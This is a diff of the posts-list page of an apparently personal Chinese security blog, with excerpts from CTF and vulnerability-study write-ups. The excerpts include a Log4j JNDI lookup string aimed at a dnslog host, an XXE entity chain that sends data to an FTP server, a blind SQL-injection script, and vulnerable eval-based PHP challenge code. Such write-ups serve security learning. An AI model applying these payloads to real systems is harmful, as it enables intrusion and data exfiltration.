@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en" dir="auto" data-theme="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -10,7 +10,7 @@
 <meta name="description" content="Posts - ch4ser の 超元域">
 <meta name="author" content="">
 <link rel="canonical" href="https://dragonbox.top/posts/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
@@ -18,7 +18,7 @@
 <link rel="mask-icon" href="https://dragonbox.top/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="https://dragonbox.top/posts/index.xml">
+<link rel="alternate" type="application/rss+xml" href="https://dragonbox.top/posts/index.xml" title="rss">
 <link rel="alternate" hreflang="en" href="https://dragonbox.top/posts/">
 <noscript>
     <style>
@@ -40,23 +40,38 @@
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
+                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
+            .toc {
+                background: var(--entry);
             }
+        }
 
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
             }
         }
 
     </style>
-</noscript><meta property="og:url" content="https://dragonbox.top/posts/">
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://dragonbox.top/posts/">
   <meta property="og:site_name" content="ch4ser の 超元域">
   <meta property="og:title" content="Posts">
   <meta property="og:locale" content="en-us">
@@ -81,20 +96,8 @@
 }
 </script>
 </head>
-
 <body class="list" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
+    <header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
@@ -130,6 +133,11 @@
                 </a>
             </li>
             <li>
+                <a href="https://dragonbox.top/friends/" title="friends">
+                    <span>friends</span>
+                </a>
+            </li>
+            <li>
                 <a href="https://dragonbox.top/about/" title="about">
                     <span>about</span>
                 </a>
@@ -146,6 +154,45 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">2021年度总结
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>这是一篇拖延了很久的年度总结,在下决心写它的时候,我已经从过年开始无所事事地玩了十几天的游戏了,本来说好要在过年那天写的总结也一直到现在才开始动笔,着实是惭愧.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-02-09 16:12:20 +0000 UTC'>February 9, 2022</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>19 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
+  <a class="entry-link" aria-label="post link to 2021年度总结" href="https://dragonbox.top/posts/gossip-2021-summary/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">pwnable尝试
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>尝试学pwn,放弃学pwn
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-01-27 17:48:33 +0000 UTC'>January 27, 2022</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>334 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
+  <a class="entry-link" aria-label="post link to pwnable尝试" href="https://dragonbox.top/posts/sec-pwnable/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">shiro 漏洞复现
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-01-22 10:52:46 +0000 UTC'>January 22, 2022</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>713 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
+  <a class="entry-link" aria-label="post link to shiro 漏洞复现" href="https://dragonbox.top/posts/sec-shiro-attack/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">thinkphp5漏洞学习
     </h2>
   </header>
@@ -153,7 +200,7 @@
     <p> phpggc中关于thinkphp的攻击思路学习
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2022-01-14 22:19:13 +0000 UTC'>January 14, 2022</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;378 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2022-01-14 22:19:13 +0000 UTC'>January 14, 2022</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>378 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to thinkphp5漏洞学习" href="https://dragonbox.top/posts/sec-phpggc-thinkphp/"></a>
 </article>
 
@@ -166,14 +213,14 @@
     <p> 明天安全圈校招面试: 面试官: 请说说你会什么技能? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 请说说你最近关注过的漏洞? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 你平时有动手调试过吗? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 我：这dnslog是不是卡了 这面试官怎么还没rce
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-12-11 14:56:51 +0000 UTC'>December 11, 2021</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;77 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-12-11 14:56:51 +0000 UTC'>December 11, 2021</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>77 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to log4j2 jndi 漏洞学习和调试" href="https://dragonbox.top/posts/sec-log4j2-jndi/"></a>
 </article>
 
 <article class="post-entry"> 
 <figure class="entry-cover">
             <img loading="lazy"
-                srcset='https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_cc03fcb6331b3f9e.png 360w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_d1b15db129f91300.png 480w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_f077dd3a6c934155.png 720w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_876107bb824b378c.png 1080w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648.png 1339w'
+                srcset='https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_fd4dafac49d430ae.png 360w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_d06f57c355bbb160.png 480w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_695663b1c1b1218.png 720w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648_hu_17eb1408bc74dfed.png 1080w,https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648.png 1339w'
                 src="https://dragonbox.top/posts/gossip-cyberpunk/image-20211119151417648.png"
                 sizes="(min-width: 768px) 720px, 100vw"
                 width="1339" height="475"
@@ -197,7 +244,7 @@
 话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.
 </p>
   </div>
-  <footer class="entry-footer"><span title='2021-11-19 11:18:11 +0000 UTC'>November 19, 2021</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;11 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-11-19 11:18:11 +0000 UTC'>November 19, 2021</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>11 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to 赛博内卷" href="https://dragonbox.top/posts/gossip-cyberpunk/"></a>
 </article>
 
@@ -210,7 +257,7 @@
     <p> 本文主要参考 https://blog.csdn.net/qq_31481187/article/details/105917392 和 https://paper.seebug.org/1142/#_6 ，并无原创内容，仅仅是个人学习笔记。
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-11-13 13:14:29 +0000 UTC'>November 13, 2021</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;243 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-11-13 13:14:29 +0000 UTC'>November 13, 2021</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>243 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to GhostCat(CVE-2020-1938)漏洞学习" href="https://dragonbox.top/posts/sec-ghostcat/"></a>
 </article>
 
@@ -223,7 +270,7 @@
     <p> 我终于更新博客了……
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-10-15 21:46:28 +0000 UTC'>October 15, 2021</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;815 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-10-15 21:46:28 +0000 UTC'>October 15, 2021</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>815 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to mysql jdbc反序列化的不深入研究" href="https://dragonbox.top/posts/sec-jdbc-unserialize/"></a>
 </article>
 
@@ -247,7 +294,7 @@ Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有li
 jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-10-01 22:10:28 +0000 UTC'>October 1, 2020</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;139 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-10-01 22:10:28 +0000 UTC'>October 1, 2020</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>139 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to 使用idea开启Servlet" href="https://dragonbox.top/posts/tech-idea-start-servlet/"></a>
 </article>
 
@@ -260,14 +307,14 @@ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同
     <p>simpleflask 和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 https://www.chainnews.com/articles/898433701852.htm, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-08-29 15:49:36 +0000 UTC'>August 29, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;248 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-08-29 15:49:36 +0000 UTC'>August 29, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>248 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to GACTF2020" href="https://dragonbox.top/posts/ctf-gactf2020/"></a>
 </article>
 
 <article class="post-entry"> 
 <figure class="entry-cover">
             <img loading="lazy"
-                srcset='https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_c6453088a6cc5644.png 360w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_1e4619c1535123dd.png 480w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_71de461c25b431b6.png 720w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_4321a0da1f2bf04c.png 1080w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w'
+                srcset='https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_2f957622007e5a69.png 360w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_38db254b1d7c2dee.png 480w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_5d28f5168d9d28e8.png 720w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu_d10821bab5ef7ff7.png 1080w,https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w'
                 src="https://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png"
                 sizes="(min-width: 768px) 720px, 100vw"
                 width="1296" height="660"
@@ -285,7 +332,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
 &lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?&gt; 然后我们可以看到ssrf.php的内容
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>370 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to qwb2020web复现" href="https://dragonbox.top/posts/ctf-qwb2020-web-1/"></a>
 </article>
 
@@ -298,7 +345,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
     <p>正常的请求
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-08-24 22:22:46 +0000 UTC'>August 24, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;319 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-08-24 22:22:46 +0000 UTC'>August 24, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>319 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to http请求走私笔记" href="https://dragonbox.top/posts/sec-http-smuggling/"></a>
 </article>
 
@@ -311,14 +358,14 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
     <p> web越來越没有牌面了…国赛果然是pwn和misc的天下
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-08-20 13:16:50 +0000 UTC'>August 20, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;306 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-08-20 13:16:50 +0000 UTC'>August 20, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>306 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to ciscn2020_online" href="https://dragonbox.top/posts/ctf-ciscn2020-online/"></a>
 </article>
 
 <article class="post-entry"> 
 <figure class="entry-cover">
             <img loading="lazy"
-                srcset='https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_2ffbbc74a7730b62.png 360w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_47bb22919e923c86.png 480w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_f4c71d06c0ad5ad7.png 720w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_c6fcb10b35a2f30f.png 1080w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png 1375w'
+                srcset='https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_b7c22d2764cb8ca.png 360w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_bc6243e04918fc70.png 480w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_782f8788af35754b.png 720w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501_hu_fadfab933a63844e.png 1080w,https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png 1375w'
                 src="https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/image-20211114142107501.png"
                 sizes="(min-width: 768px) 720px, 100vw"
                 width="1375" height="597"
@@ -340,7 +387,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
 &lt;!ENTITY % param3 &#34;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;ftp://vps/%data3;&#39;&gt;&#34;&gt; vps上开启ftp监听脚本, 脚本如下
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-05-11 16:11:31 +0000 UTC'>May 11, 2020</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;796 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-05-11 16:11:31 +0000 UTC'>May 11, 2020</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>796 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to 网鼎杯2020 web" href="https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"></a>
 </article>
 
@@ -353,7 +400,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
     <p>padding oracle 原理: https://www.freebuf.com/articles/database/150606.html
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-02-03 16:42:20 +0000 UTC'>February 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1041 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-02-03 16:42:20 +0000 UTC'>February 3, 2020</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>1041 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to padding_oracle 和 cbc字节反转" href="https://dragonbox.top/posts/sec-padding-oracle-and-cbc-attack/"></a>
 </article>
 
@@ -366,7 +413,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
     <p>昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语……得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-01-08 05:29:24 +0000 UTC'>January 8, 2020</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;45 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-01-08 05:29:24 +0000 UTC'>January 8, 2020</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>45 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to 临行前夜--2019" href="https://dragonbox.top/posts/gossip-note-before-back/"></a>
 </article>
 
@@ -379,7 +426,7 @@ if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileE
     <p>开一个新坑~~
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-01-03 10:57:44 +0000 UTC'>January 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;950 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-01-03 10:57:44 +0000 UTC'>January 3, 2020</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>950 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to java_web题目复现记录" href="https://dragonbox.top/posts/sec-java-web/"></a>
 </article>
 
@@ -394,7 +441,7 @@ https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;435 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>435 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to LD_PRELOAD劫持类型题目" href="https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/"></a>
 </article>
 
@@ -408,14 +455,14 @@ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
 开局计算哈希, 爆破爆破
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2019-12-19 20:51:05 +0000 UTC'>December 19, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;598 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2019-12-19 20:51:05 +0000 UTC'>December 19, 2019</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>598 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to copperstudy-record" href="https://dragonbox.top/posts/ctf-qwb-copperstudy-record/"></a>
 </article>
 
 <article class="post-entry"> 
 <figure class="entry-cover">
             <img loading="lazy"
-                srcset='https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_1f982888fedde896.png 360w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_8f1e2668d3881b10.png 480w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w'
+                srcset='https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_7280d0d844140dc1.png 360w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085_hu_cb1881015bb9c1d9.png 480w,https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png 693w'
                 src="https://dragonbox.top/posts/ctf-roarctfwp/image-20211114142019085.png"
                 sizes="(min-width: 768px) 720px, 100vw"
                 width="693" height="347"
@@ -436,70 +483,8 @@ $result = query(&#34;select current_ip, last_ip from ip_log where uuid = &#39;&#
 #!/usr/bin/env python3 import requests target = &#34;http://localhost:8302/&#34; def execute_sql(sql): print(&#34;[*]请求语句：&#34; &#43; sql) return_result = &#34;&#34; payload = &#34;0&#39;|length((&#34; &#43; sql &#43; &#34;))|&#39;0&#34; session = requests.session() r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) length = int(r.text[start_pos &#43; 9: end_pos]) print(&#34;[&#43;]长度：&#34; &#43; str(length)) for i in range(1, length &#43; 1, 5): payload = &#34;0&#39;|conv(hex(substr((&#34; &#43; sql &#43; &#34;),&#34; &#43; str(i) &#43; &#34;,5)),16,10)|&#39;0&#34; r = session.get(target, headers={&#39;X-Forwarded-For&#39;: payload}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) r = session.get(target, headers={&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;}) start_pos = r.text.find(&#34;Last Ip: &#34;) end_pos = r.text.find(&#34; --&gt;&#34;, start_pos) result = int(r.text[start_pos &#43; 9: end_pos]) return_result &#43;= bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;) print(&#34;[&#43;]位置 &#34; &#43; str(i) &#43; &#34; 请求五位成功:&#34; &#43; bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;)) return return_result # 获取数据库 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39;&#34;)) # 获取数据库表 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#39;F4l9_D4t4B45e&#39; AND TABLE_NAME = &#39;F4l9_t4b1e&#39; &#34;)) # 获取表中内容 print(&#34;[&#43;]获取成功：&#34; &#43; execute_sql(&#34;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&#34;)) 5555555
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2019-10-22 08:32:09 +0000 UTC'>October 22, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;611 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2019-10-22 08:32:09 +0000 UTC'>October 22, 2019</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>611 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to RoarCTF 2019复现" href="https://dragonbox.top/posts/ctf-roarctfwp/"></a>
-</article>
-
-<article class="post-entry"> 
-<figure class="entry-cover">
-            <img loading="lazy"
-                srcset='https://dragonbox.top/posts/ctf-bytectf2019/image-20211114141103041_hu_3cf4b2ecb9d83fc5.png 360w,https://dragonbox.top/posts/ctf-bytectf2019/image-20211114141103041_hu_2ddcc30ddc7de9c8.png 480w,https://dragonbox.top/posts/ctf-bytectf2019/image-20211114141103041_hu_80a933c8286c7283.png 720w,https://dragonbox.top/posts/ctf-bytectf2019/image-20211114141103041.png 917w'
-                src="https://dragonbox.top/posts/ctf-bytectf2019/image-20211114141103041.png"
-                sizes="(min-width: 768px) 720px, 100vw"
-                width="917" height="577"
-                alt="">
-</figure>
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">bytectf2019
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>boring code source code
-&lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\/\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]&#43;\((?R)?\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &#34;error: host not allowed&#34;; } } else { echo &#34;error: invalid url&#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload
